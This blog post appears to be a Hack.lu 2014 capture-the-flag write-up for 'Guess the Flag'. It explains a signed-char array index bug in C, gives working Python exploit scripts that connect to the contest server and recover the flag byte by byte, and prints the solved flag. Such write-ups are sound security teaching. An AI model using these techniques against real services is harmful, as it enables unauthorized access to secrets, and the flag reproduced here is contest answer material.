---
layout: post
title: "Hack.lu 2014 - Guess the Flag"
date: 2014-10-28 15:05
comments: true
author: WuTangLAN 
categories: [hacklu, exploiting]
---
## Challenge
Look at that guy over there! He's a bandit from the group that robs the
stagecoaches in unpredictable intervals. I think he hasn't been with them for
very long, so he can't tell whether you're one of them. Try to look like a
bandit and talk to him. He probably won't just tell you their plan for the
attack, but maybe you can ask him some questions?

nc wildwildweb.fluxfingers.net 1412

### Partial Source
```c
int is_flag_correct(char *flag_hex /* the user's guess in hex */) {
  if (strlen(flag_hex) != 100) {
    printf("bad input, that hexstring should be 100 chars, but was %d chars long!\n", (int)strlen(flag_hex));
    exit(0);
  }

  char bin_by_hex[256] = { /* table for looking up the value of a hex character – -1 means invalid */
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
     0,  1,  2,  3,  4,  5,  6,  7,  8,  9, -1, -1, -1, -1, -1, -1, /* 0-9 */
    -1, 10, 11, 12, 13, 14, 15, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* A-F */
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, 10, 11, 12, 13, 14, 15, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* a-f */
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
  };

  /* the correct flag was censored out */
  char flag[50] = "flag{0123456789abcdef0123456789abcdef0123456789ab}";

  // decode flag_hex into given_flag so we can compare them
  char given_flag[50];
  bzero(given_flag, 50);
  for (int i=0; i<50; i++) {
    char value1 = bin_by_hex[flag_hex[i*2  ]];
    char value2 = bin_by_hex[flag_hex[i*2+1]];
    if (value1 == -1 || value2 == -1) {
      printf("bad input – one of the characters you supplied was not a valid hex character!\n");
      exit(0);
    }
    given_flag[i] = (value1<<4) | value2;
  }

  // timing-safe comparison of the two flags
  char diff = 0;
  for (int i=0; i<50; i++) {
    diff |= (flag[i] ^ given_flag[i]);
  }

  return (diff == 0);
}
```

## Analysis

An visual inspection of the source code raised some potential issues, but they
were all red herrings. For instance, the rtrim() function increments by 2
instead of one, but that doesn't buy us anything:

```c
void rtrim(char *str) {
  for (char *p = str+strlen(str)-1; p>=str; p--) {
    if (!strchr(" \r\n", *p)) break;
    *p = '\0';
    p--;
  }
}
```

The challenge prompt says to compile the source with `gcc -std=gnu99 -g`, but
we added `-Wall and -Wextra` and compiled:

```
guess_the_flag_censored.c:51:3: warning: implicit declaration of function ‘bzero’ [-Wimplicit-function-declaration]
   bzero(given_flag, 50);
   ^
guess_the_flag_censored.c:53:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
     char value1 = bin_by_hex[flag_hex[i*2  ]];
     ^
guess_the_flag_censored.c:54:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
     char value2 = bin_by_hex[flag_hex[i*2+1]];
     ^
```

Joy! an array is indexed with a character type, which is treated as a signed
value. The focus is now on exploiting that in order to access or change the
`flag` which is also stored on the stack. The potentially negative indicies are
only used when reading, which eliminates the possibility of injecting
shellcode. This seemed to be a let-down at first, but what we do see is that
the `value1` and `value2` variables can be influenced. This leads to the
population of the `given_flag` string. Can we force `given_flag` to be accepted
by copying the bytes from `flag`?

## Solution

We ran the program locally under a debugger to discover that `flag` is located
128 bytes before `bin_by_hex`. Subtract the "flag{" prefix, and the offset for
the 44 byte hexadecimal string is at offset -123. The following code generates
an input which should exploit the defect:

```python
#!/usr/bin/env python
import sys

start = -123

# Python doesn't support chr(-x), so do unsigned -> signed conversion.
def twos_comp(n):
    return 256 + n

# Generate a flag which exploits the char-index defect. This flag should always
# work, even though it is an invalid format.
# In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)
def generate_flag():
    s = twos_comp(start)
    l = []
    # This loop causes server to copy the hidden flag; instead of expanding hex
    for i in xrange(44):
        l += ['0' + chr(s + i)] # Put a zero in the high order nibble
                                # Place negative offset of this flag char in low-order
    return l
  
# Format the flag and encode it for the wire
def encode_flag(f):
    return 'flag{'.encode('hex') + \
           ''.join(f) + \
           '}'.encode('hex') + '\n'

sys.stdout.write(encode_flag(generate_flag()))
```

The output ends up looking like: `666c61677b0\x850\x860\x870\x88...` where
`666c61677b` is the encoded "flag{", the zero nibbles corresponds to `value1`,
and the 0x85,0x86,... are negative integers corresponding to `value2`. This
leads to populating `given_flag` as:
```c
for (i=0; i<50; i++) { given_flag[i] = (0<<4) | flag[i] }
```

Sure enough, this payload works locally, but it fails remotely. Is the system
employing ASLR? Is the layout static, but different somehow? We could write
code to guess the offset, but let's just see what happens if we assume the
system is 32-bit. Compile with `-m32` and we see the offset is now 64 bytes
instead of 128. Therefore, we change start from -123 to -59. This change works
against the server and we now see: "Yaaaay! You guessed the flag correctly! But
do you still remember what you entered? If not, feel free to try again!"

We don't have the flag, but we do have a way to test each byte in isolation. We
start with the payload we generated, and try all hexadecimal values [0-9a-f]
for the first character until the correct one is found. Then, repeat with the
second character, until the last (44th) character is verified. Therefore, the
problem space is greatly reduced from 16^44 to 16*44; 50 orders of magnitude.

The complete solution is listed below:
```python
#!/usr/bin/env python

import sys, socket

# stack location of flags var, relative to bit_to_hex
start = -59            # For 64-bit machines replace with: -123
host  = 'wildwildweb.fluxfingers.net'
port  = 1412

# Python doesn't support chr(-x), so do unsigned -> signed conversion.
def twos_comp(n):
    return 256 + n

# Generate a flag which exploits the char-index defect. This flag should always
# work, even though it is an invalid format.
# In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)
def generate_flag():
    s = twos_comp(start)
    l = []
    # This loop causes server to copy the hidden flag; instead of expanding hex
    for i in xrange(44):
        l += ['0' + chr(s + i)] # Put a zero in the high order nibble
                                # Place negative offset of this flag char in low-order
    return l

# Format the flag and encode it for the wire
def encode_flag(f):
    return 'flag{'.encode('hex') + \
           ''.join(f) + \
           '}'.encode('hex') + '\n'

# Were we successful?
def check_resp(r):
    return r.startswith('Yaaaay')

# Were we successful (for the prior request)?
def check_sock(s):
    rv = check_resp(s.recv(1024))
    return rv

# Send a flag to the server
def send_flag(s, f):
    # Eat the prompt
    s.recv(1024)
    # Bonvoyage!
    s.send(encode_flag(f))

# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Eat the MOTD
print s.recv(1024)

# This flag should work, as long as the offset is correct
base = generate_flag()

print "VERIFYING FLAG OFFSET..."
send_flag(s, base)
if check_sock(s):
    print "  Success!"
else:
    print "  Failed!"
    sys.exit(1)

# Accumulate the flag as it is discovered
discovered = []

for i in xrange(len(base)):
    mutant = base[:]
    disc_byte = '??'
    for j in '0123456789abcdef':
        byte = j.encode('hex')
        mutant[i] = byte

        send_flag(s, mutant)
        if check_sock(s):
            disc_byte = byte
            print "%d -> 0x%s" % (i, byte)
            break
    discovered += disc_byte
            
print "VERIFYING FINAL FLAG..."
send_flag(s, discovered)
if check_sock(s):
    print "  Success! The flag is: %s" % encode_flag(discovered)
else:
    print "  Failed!"
```

The result is
```
666c61677b3639373437333661373537
33373436633639366236353639366537
34363836353664366637363639363537
337d
```
Decode, and we get "flag{6974736a7573746c696b65696e7468656d6f76696573}".
